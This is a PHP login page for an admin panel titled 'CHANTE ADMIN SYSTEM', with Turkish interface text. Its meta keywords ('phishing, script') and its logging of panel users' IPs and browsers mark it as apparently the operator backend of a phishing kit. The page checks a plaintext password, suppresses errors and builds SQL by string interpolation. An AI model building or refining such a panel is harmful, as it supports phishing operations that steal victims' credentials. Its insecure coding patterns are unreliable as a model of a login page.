<?php 
session_start();
ob_start();
date_default_timezone_set('Europe/Istanbul');
include("../mysql.php");
include("core/getRealIPAdress.php");
include("core/browserDetect.php");
$mysqli = $_SESSION['mysqli'];
$ip = getUserIP();

$pass_st = mysqli_query($mysqli, "SELECT * FROM site WHERE id = '1'");
$sonuc = mysqli_fetch_array($pass_st);
error_reporting(0);
if(isset($_SESSION["login"])){
header('Location:index.php');
} else {
?>
<!doctype html>
<html lang="tr" dir="ltr">
  <head>
    <!-- META DATA -->
    <meta charset="UTF-8">
    <meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=0'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="CHANTE ADMIN SYSTEM">
    <meta name="author" content="Chante">
    <meta name="keywords" content="phishing, script">
    <!-- TITLE -->
    <title>CHANTE ADMIN SYSTEM</title>
    <!-- BOOTSTRAP CSS -->
    <link id="style" href="assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
    <!-- STYLE CSS -->
    <link href="assets/css/style.css" rel="stylesheet" />
    <link href="assets/css/dark-style.css" rel="stylesheet" />
    <link href="assets/css/transparent-style.css" rel="stylesheet">
    <link href="assets/css/skin-modes.css" rel="stylesheet" />
    <!--- FONT-ICONS CSS -->
    <link href="assets/css/icons.css" rel="stylesheet" />
    <!-- COLOR SKIN CSS -->
    <link id="theme" rel="stylesheet" type="text/css" media="all" href="assets/colors/color1.css" />
  </head>
  <body class="app sidebar-mini ltr">
    <!-- BACKGROUND-IMAGE -->
    <div class="login-img">
      <!-- PAGE -->
      <div class="page">
        <div class="">
          <!-- CONTAINER OPEN -->
          <div class="col col-login mx-auto mt-7">
            <div class="text-center">
              <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img" alt="">
            </div>
          </div>
          <div class="container-login100">
            <div class="wrap-login100 p-6">
              <form method="POST" action="" class="login100-form validate-form">
                <span class="login100-form-title pb-5"> Hoşgeldin </span>
                <div class="panel panel-primary">
                  <div class="panel-body tabs-menu-body p-0 pt-2">
                    <div class="tab-content">
                      <div class="tab-pane active" id="tab6">
                        <div id="mobile-num" class="wrap-input100 validate-input input-group mb-4">
                          <input name="password" type="password" required class="input100 border-start-0 form-control ms-0">
                        </div>
                        <span>Not: Panel şifrenizi çalışmadığınız kişilerle paylaşmayın.</span>
                        <div class="container-login100-form-btn ">
                          <button type="submit" class="login100-form-btn btn-primary"> Giriş Yap </button>
							<?php 
								if($_POST["password"]==$sonuc['pass'])
								{
									$_SESSION["login"] = "true";
									$_SESSION["pass"] = $sonuc['pass'];
									$tarih = date('d.m.Y H:i');
									$tarayici;
									mysqli_query($mysqli, "INSERT INTO paneldekiler SET ip=('$ip'),tarih=('$tarih'),tarayici=('$tarayici')");
									header("Location:index.php");
								}
							?>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
          <!-- CONTAINER CLOSED -->
        </div>
      </div>
      <!-- End PAGE -->
    </div>
    <!-- BACKGROUND-IMAGE CLOSED -->
    <!-- JQUERY JS -->
    <script src="assets/js/jquery.min.js"></script>
    <!-- BOOTSTRAP JS -->
    <script src="assets/plugins/bootstrap/js/popper.min.js"></script>
    <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script>
    <!-- SHOW PASSWORD JS -->
    <script src="assets/js/show-password.min.js"></script>
    <!-- Perfect SCROLLBAR JS-->
    <script src="assets/plugins/p-scroll/perfect-scrollbar.js"></script>
    <!-- Color Theme js -->
    <script src="assets/js/themeColors.js"></script>
    <!-- CUSTOM JS -->
    <script src="assets/js/custom.js"></script>
  </body>
</html> <?php } ?>